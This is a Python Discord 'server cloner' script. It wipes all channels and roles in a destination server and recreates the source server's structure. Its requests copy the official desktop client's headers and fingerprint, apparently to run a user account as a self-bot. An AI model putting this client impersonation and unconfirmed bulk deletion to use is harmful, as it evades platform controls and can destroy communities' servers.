import requests, time
from os import system

GREEN = '\033[92m'
PURPLE = '\033[95m'
RED = '\033[91m'
GRAY = '\033[90m'
ENDC = '\033[0m'

def validate_input(prompt, validator, error_message):
    while True:
        user_input = input(prompt).strip()
        if validator(user_input):
            return user_input
        else:
            print(RED + error_message + ENDC)

def validate_token(token):
    headers = {'Authorization': token}
    try:
        response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def delete_all_channels(token, guild_id):
    headers = {'Authorization': token, 'Authority': 'discord.com', 'Accept': '*/*', 'Accept-Language': 'sv,sv-SE;q=0.9', 'Content-Type': 'application/json', 'Origin': 'https://discord.com', 'Referer': 'https://discord.com/', 'Sec-Ch-Ua': '"Not?A_Brand";v="8", "Chromium";v="108"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36', 'X-Debug-Options': 'bugReporterEnabled', 'X-Discord-Locale': 'en-US', 'X-Discord-Timezone': 'Europe/Stockholm', 'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTI3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjMxMzM0NCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}
    try:
        response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers)
        response.raise_for_status()
        channels = response.json()
        print(PURPLE + f"[#] Deleting {len(channels)} channels / categories.." + ENDC)
        for channel in channels:
            while True:
                response = requests.delete(f'https://discord.com/api/v9/channels/{channel["id"]}', headers=headers)
                if response.status_code == 200:
                    print(GREEN + f"[#] Successfully deleted Channel" + ENDC + " : " + PURPLE + channel['name'] + ENDC)
                    break
                elif response.status_code == 404:
                    print(RED + "[!] Channel not found (404), skipping..." + ENDC + " : " + PURPLE + channel['name'] + ENDC)
                    break
                elif response.status_code == 429:
                    retry_after = int(response.headers.get('Retry-After', 5))
                    print(RED + "[!] Failed to delete Channel" + ENDC + " : " + PURPLE + channel['name'] + RED + f" - RSC: {response.status_code}" + ENDC)
                    print(f"[#] Retrying in {retry_after} second{'s' if retry_after != 1 else ''}...")
                    time.sleep(retry_after)
                else:
                    print(RED + "[!] Failed to delete Channel" + ENDC + " : " + PURPLE + channel['name'] + RED + f" - RSC: {response.status_code}" + ENDC)
                    break
        return True
    except requests.exceptions.RequestException as e:
        print(RED + f"[!] Error occurred: {e}" + ENDC)
        return False

def delete_all_roles(token, guild_id):
    headers = {'Authorization': token, 'Authority': 'discord.com', 'Accept': '*/*', 'Accept-Language': 'sv,sv-SE;q=0.9', 'Content-Type': 'application/json', 'Origin': 'https://discord.com', 'Referer': 'https://discord.com/', 'Sec-Ch-Ua': '"Not?A_Brand";v="8", "Chromium";v="108"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36', 'X-Debug-Options': 'bugReporterEnabled', 'X-Discord-Locale': 'en-US', 'X-Discord-Timezone': 'Europe/Stockholm', 'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTI3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjMxMzM0NCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}
    try:
        response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers)
        response.raise_for_status()
        roles = response.json()
        print(PURPLE + f"[#] Deleting {len(roles)} roles.." + ENDC)
        for role in roles:
            if role['name'] != '@everyone':
                while True:
                    response = requests.delete(f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role["id"]}', headers=headers)
                    if response.status_code == 204:
                        print(GREEN + f"[#] Successfully deleted Role" + ENDC + " : " + PURPLE + role['name'] + ENDC)
                        break
                    elif response.status_code == 404:
                        print(RED + "[!] Role not found (404), skipping..." + ENDC + " : " + PURPLE + role['name'] + ENDC)
                        break
                    elif response.status_code == 429:
                        retry_after = int(response.headers.get('Retry-After', 5))
                        print(RED + "[!] Failed to delete Role" + ENDC + " : " + PURPLE + role['name'] + RED + f" - RSC: {response.status_code}" + ENDC)
                        print(f"[#] Retrying in {retry_after} second{'s' if retry_after != 1 else ''}...")
                        time.sleep(retry_after)
                    else:
                        print(RED + "[!] Failed to delete Role" + ENDC + " : " + PURPLE + role['name'] + RED + f" - RSC: {response.status_code}" + ENDC)
                        break
        return True
    except requests.exceptions.RequestException as e:
        print(RED + f"[!] Error occurred: {e}" + ENDC)
        return False

def fetch_categories_and_channels(token, guild_id):
    headers = {'Authorization': token, 'Authority': 'discord.com', 'Accept': '*/*', 'Accept-Language': 'sv,sv-SE;q=0.9', 'Content-Type': 'application/json', 'Origin': 'https://discord.com', 'Referer': 'https://discord.com/', 'Sec-Ch-Ua': '"Not?A_Brand";v="8", "Chromium";v="108"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36', 'X-Debug-Options': 'bugReporterEnabled', 'X-Discord-Locale': 'en-US', 'X-Discord-Timezone': 'Europe/Stockholm', 'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTI3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjMxMzM0NCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}
    try:
        response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers)
        response.raise_for_status()
        channels = response.json()
        return channels
    except requests.exceptions.RequestException as e :
        print(RED + f"[!] Failed to fetch Categories and Channels: {e}" + ENDC)
        return None

def fetch_roles(token, guild_id):
    headers = {'Authorization': token, 'Authority': 'discord.com', 'Accept': '*/*', 'Accept-Language': 'sv,sv-SE;q=0.9', 'Content-Type': 'application/json', 'Origin': 'https://discord.com', 'Referer': 'https://discord.com/', 'Sec-Ch-Ua': '"Not?A_Brand";v="8", "Chromium";v="108"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36', 'X-Debug-Options': 'bugReporterEnabled', 'X-Discord-Locale': 'en-US', 'X-Discord-Timezone': 'Europe/Stockholm', 'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTI3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjMxMzM0NCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}
    try:
        response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers)
        response.raise_for_status()
        roles = response.json()
        roles = [role for role in roles if not role['managed']]
        return roles
    except requests.exceptions.RequestException as e:
        print(f"[!] Failed to fetch Roles: {e}")
        return None

def clone_categories(token, source_guild_id, destination_guild_id):
    headers = {'Authorization': token, 'Authority': 'discord.com', 'Accept': '*/*', 'Accept-Language': 'sv,sv-SE;q=0.9', 'Content-Type': 'application/json', 'Origin': 'https://discord.com', 'Referer': 'https://discord.com/', 'Sec-Ch-Ua': '"Not?A_Brand";v="8", "Chromium";v="108"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36', 'X-Debug-Options': 'bugReporterEnabled', 'X-Discord-Locale': 'en-US', 'X-Discord-Timezone': 'Europe/Stockholm', 'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTI3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjMxMzM0NCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}

    try:
        response = requests.get(f'https://discord.com/api/v10/guilds/{source_guild_id}/channels', headers=headers)
        response.raise_for_status()
        categories_and_channels = response.json()
        
        categories = [category for category in categories_and_channels if category['type'] == 4]
        print(PURPLE + f"[#] Cloning {len(categories)} categories.." + ENDC)
        
        category_mapping = {}
        created_categories = set()
        
        for category in categories:
            if category['id'] in created_categories:
                continue

            while True:
                permission_overwrites = [
                    {
                        'id': po['id'],
                        'type': po['type'],
                        'allow': str(po['allow']),
                        'deny': str(po['deny'])
                    }
                    for po in category.get('permission_overwrites', [])
                    if po['type'] == 0
                ]
                
                payload = {
                    'name': category['name'],
                    'type': 4, 
                    'position': category['position'],
                    'permission_overwrites': permission_overwrites
                }
                response = requests.post(f'https://discord.com/api/v10/guilds/{destination_guild_id}/channels', headers=headers, json=payload)
                
                if response.status_code == 201:
                    new_category = response.json()
                    category_mapping[category['id']] = new_category['id']
                    created_categories.add(category['id'])
                    print(GREEN + f"[#] Successfully created Category" + ENDC + " : " + PURPLE + category['name'] + ENDC)
                    break
                elif response.status_code == 429:
                    retry_after = int(response.headers.get('Retry-After', 5))
                    print(RED + "[!] Failed to create Category" + ENDC + " : " + PURPLE + category['name'] + RED + f" - RSC: {response.status_code}" + ENDC)
                    print(f"[#] Retrying in {retry_after} second{'s' if retry_after != 1 else ''}...")
                    time.sleep(retry_after)
                else:
                    print(RED + "[!] Failed to create Category" + ENDC + " : " + PURPLE + category['name'] + RED + f" - RSC: {response.status_code}" + ENDC)
                    break

        return category_mapping
    except requests.exceptions.RequestException as e:
        print(RED + f"[!] Error occurred: {e}" + ENDC)
        return None

def clone_roles(token, source_guild_id, destination_guild_id):
    headers = {'Authorization': token, 'Authority': 'discord.com', 'Accept': '*/*', 'Accept-Language': 'sv,sv-SE;q=0.9', 'Content-Type': 'application/json', 'Origin': 'https://discord.com', 'Referer': 'https://discord.com/', 'Sec-Ch-Ua': '"Not?A_Brand";v="8", "Chromium";v="108"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36', 'X-Debug-Options': 'bugReporterEnabled', 'X-Discord-Locale': 'en-US', 'X-Discord-Timezone': 'Europe/Stockholm', 'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTI3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjMxMzM0NCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}

    try:
        response = requests.get(f'https://discord.com/api/v9/guilds/{source_guild_id}/roles', headers=headers)
        response.raise_for_status()
        roles = response.json()
        print(PURPLE + f"[#] Cloning {len(roles)} roles.." + ENDC)
        
        role_mapping = {}
        roles = [role for role in roles if not role['managed'] and role['name'] != '@everyone']
        
        roles.sort(key=lambda r: r['position'], reverse=True)
        
        for role in roles:
            while True:
                payload = {
                    'name': role['name'],
                    'permissions': role['permissions'],
                    'color': role['color'],
                    'hoist': role['hoist'],
                    'mentionable': role['mentionable'],
                    'position': role['position']
                }
                
                response = requests.post(f'https://discord.com/api/v9/guilds/{destination_guild_id}/roles', headers=headers, json=payload)
                
                if response.status_code == 200:
                    new_role = response.json()
                    role_mapping[role['id']] = new_role['id']
                    print(GREEN + f"[#] Successfully created Role" + ENDC + " : " + PURPLE + role['name'] + ENDC)
                    break
                elif response.status_code == 429:
                    retry_after = int(response.headers.get('Retry-After', 5))
                    print(RED + "[!] Failed to create Role" + ENDC + " : " + PURPLE + role['name'] + RED + f" - RSC: {response.status_code}" + ENDC)
                    print(f"[#] Retrying in {retry_after} second{'s' if retry_after != 1 else ''}...")
                    time.sleep(retry_after)
                else:
                    print(RED + "[!] Failed to create Role" + ENDC + " : " + PURPLE + role['name'] + RED + f" - RSC: {response.status_code}" + ENDC)
                    break

        return role_mapping
    except requests.exceptions.RequestException as e:
        print(RED + f"[!] Error occurred: {e}" + ENDC)
        return None

def clone_channels(token, source_server_id, destination_server_id, category_mapping, role_mapping):
    headers = {'Authorization': token, 'Authority': 'discord.com', 'Accept': '*/*', 'Accept-Language': 'sv,sv-SE;q=0.9', 'Content-Type': 'application/json', 'Origin': 'https://discord.com', 'Referer': 'https://discord.com/', 'Sec-Ch-Ua': '"Not?A_Brand";v="8", "Chromium";v="108"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36', 'X-Debug-Options': 'bugReporterEnabled', 'X-Discord-Locale': 'en-US', 'X-Discord-Timezone': 'Europe/Stockholm', 'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTI3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjMxMzM0NCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}

    try:
        response = requests.get(f'https://discord.com/api/v10/guilds/{source_server_id}/channels', headers=headers)
        response.raise_for_status()
        channels = response.json()
        
        num_channels = len([c for c in channels if c['type'] in [0, 1, 2, 5, 13, 15]])
        print(PURPLE + f"[#] Cloning {num_channels} channels..." + ENDC)

        for channel in channels:
            if channel['type'] == 4:
                continue
            
            channel_data = {
                'name': channel['name'],
                'type': channel['type'],
                'topic': channel.get('topic'),
                'parent_id': category_mapping.get(channel['parent_id']),
                'position': channel['position'],
                'nsfw': channel.get('nsfw', False),
                'rate_limit_per_user': channel.get('rate_limit_per_user', 0),
                'permission_overwrites': []
            }

            for overwrite in channel.get('permission_overwrites', []):
                if overwrite['type'] == 0:
                    mapped_id = role_mapping.get(overwrite['id'], overwrite['id'])
                    channel_data['permission_overwrites'].append({
                        'id': mapped_id,
                        'type': 0,
                        'allow': str(overwrite['allow']),
                        'deny': str(overwrite['deny'])
                    })

            while True:
                response = requests.post(f'https://discord.com/api/v10/guilds/{destination_server_id}/channels', headers=headers, json=channel_data)
                
                if response.status_code == 201:
                    print(GREEN + f"[#] Successfully created Channel: {channel['name']}" + ENDC)
                    break
                elif response.status_code == 429:
                    retry_after = int(response.headers.get('Retry-After', 5))
                    print(RED + f"[!] Failed to create Channel: {channel['name']} - RSC: 429" + ENDC)
                    print(f"[#] Retrying in {retry_after} second{'s' if retry_after != 1 else ''}...")
                    time.sleep(retry_after)
                else:
                    print(RED + f"[!] Failed to create Channel: {channel['name']} - RSC: {response.status_code}" + ENDC)
                    break

    except requests.exceptions.RequestException as e:
        print(RED + f"[!] Error occurred: {e}" + ENDC)
    
system("title " + f"Cloner")
def main():
    
    print(r"""
      /$$$$$$  /$$        /$$$$$$  /$$   /$$ /$$$$$$$$ /$$$$$$$ 
     /$$__  $$| $$       /$$__  $$| $$$ | $$| $$_____/| $$__  $$
    | $$  \__/| $$      | $$  \ $$| $$$$| $$| $$      | $$  \ $$
    | $$      | $$      | $$  | $$| $$ $$ $$| $$$$$   | $$$$$$$/
    | $$      | $$      | $$  | $$| $$  $$$$| $$__/   | $$__  $$
    | $$    $$| $$      | $$  | $$| $$\  $$$| $$      | $$  \ $$
    |  $$$$$$/| $$$$$$$$|  $$$$$$/| $$ \  $$| $$$$$$$$| $$  | $$
     \______/ |________/ \______/ |__/  \__/|________/|__/  |__/
                                                                

    """)
    user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
    source_server_id = validate_input(PURPLE + "[#] Clone from Server ID: " + ENDC, lambda id: id.isdigit() and len(id) == 19, "[#] Invalid Server ID. Please check the ID and try again.")
    destination_server_id = validate_input(PURPLE + "[#] Clone to Server ID: " + ENDC, lambda id: id.isdigit() and len(id) == 19, "[#] Invalid Server ID. Please check the ID and try again.")
    
    if not delete_all_channels(user_token, destination_server_id):
        print(RED + "[!] Failed to delete all Channels in Clone to Server." + ENDC)
        return
    
    if not delete_all_roles(user_token, destination_server_id):
        print(RED + "[!] Failed to delete all Roles in Clone to Server." + ENDC)
        return

    categories_and_channels = fetch_categories_and_channels(user_token, source_server_id)
    if not categories_and_channels:
        print(RED + "[!] Failed to fetch categories and channels from source server." + ENDC)
        return
    
    category_mapping = clone_categories(user_token, source_server_id, destination_server_id)
    if not category_mapping:
        print(RED + "[!] Failed to clone categories." + ENDC)
        return
    
    role_mapping = clone_roles(user_token, source_server_id, destination_server_id)
    if not role_mapping:
        print(RED + "[!] Failed to clone roles." + ENDC)
        return
    
    clone_channels(user_token, source_server_id, destination_server_id, category_mapping, role_mapping)
    
    print(GREEN + "[#] Server cloned successfully!" + ENDC)
    input(PURPLE + "[#] Press enter to exit." + ENDC)

if __name__ == "__main__":
    main()
